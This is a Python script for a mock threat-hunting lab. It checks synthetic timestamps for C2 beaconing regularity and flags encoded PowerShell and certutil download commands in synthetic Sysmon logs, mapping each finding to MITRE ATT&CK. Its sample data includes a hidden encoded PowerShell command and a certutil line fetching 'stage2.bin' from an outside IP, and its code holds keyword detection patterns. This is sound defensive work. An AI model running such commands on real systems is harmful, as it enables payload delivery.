#!/usr/bin/env python3
"""
Local Mock Lab — spec_cyber_hunt (CyberOps Proactive Threat Hunting: MITRE ATT&CK, C2 Beaconing & LOLBins)
Simulates hypothesis-driven threat hunting over synthetic Sysmon + DNS telemetry to detect:
1) Periodic C2 HTTP/DNS beaconing (low jitter interval regularity),
2) Suspicious PowerShell encoded command + LOLBin (certutil) download,
3) Mapping detections to MITRE ATT&CK Tactics/Techniques while suppressing benign admin activity.
No real SIEM, EDR, Zeek sensor, or live malware is executed.
"""

import json
import statistics


def detect_beaconing(timestamps_sec: list[int], max_jitter_ratio: float = 0.08) -> dict:
    deltas = [b - a for a, b in zip(timestamps_sec, timestamps_sec[1:])]
    mean_d = statistics.mean(deltas)
    stdev_d = statistics.pstdev(deltas)
    jitter_ratio = round(stdev_d / mean_d, 4) if mean_d else 1.0
    return {
        "intervals_sec": deltas,
        "mean_interval_sec": round(mean_d, 2),
        "jitter_ratio": jitter_ratio,
        "beaconing_suspected": jitter_ratio <= max_jitter_ratio,
        "mitre_attack": "T1071.001 / TA0011 (Command and Control)" if jitter_ratio <= max_jitter_ratio else None,
    }


def hunt_sysmon_events(events: list[dict]) -> list[dict]:
    findings = []
    for ev in events:
        cmd = ev["command_line"].lower()
        if "powershell" in cmd and ("-enc" in cmd or "-encodedcommand" in cmd):
            findings.append({
                "host": ev["host"],
                "process": ev["process"],
                "severity": "HIGH",
                "hypothesis": "Obfuscated PowerShell Execution",
                "mitre_tactic": "TA0002 Execution",
                "mitre_technique": "T1059.001 (PowerShell)",
            })
        elif "certutil" in cmd and "-urlcache" in cmd:
            findings.append({
                "host": ev["host"],
                "process": ev["process"],
                "severity": "HIGH",
                "hypothesis": "LOLBin Ingress Tool Transfer via certutil",
                "mitre_tactic": "TA0011 Command and Control",
                "mitre_technique": "T1105 (Ingress Tool Transfer)",
            })
    return findings


def main() -> None:
    c2_beacon_times = [0, 60, 121, 180, 242, 300, 361]
    normal_browsing_times = [0, 14, 180, 195, 620, 625, 1100]
    sysmon_logs = [
        {"host": "WKSTN-FIN-09", "process": "powershell.exe", "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA..."},
        {"host": "WKSTN-FIN-09", "process": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://198.51.100.77/stage2.bin"},
        {"host": "SRV-BACKUP-01", "process": "robocopy.exe", "command_line": "robocopy D:\\Data \\\\NAS01\\Backup /MIR"},
    ]
    report = {
        "mode": "LOCAL_MOCK_NO_REAL_SIEM_EDR_OR_MALWARE",
        "c2_beaconing_analysis": {
            "suspicious_host_10_10_40_19": detect_beaconing(c2_beacon_times),
            "benign_user_10_10_40_22": detect_beaconing(normal_browsing_times),
        },
        "sysmon_lolbin_findings": hunt_sysmon_events(sysmon_logs),
        "benign_events_filtered": len(sysmon_logs) - len(hunt_sysmon_events(sysmon_logs)),
    }
    print(json.dumps(report, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
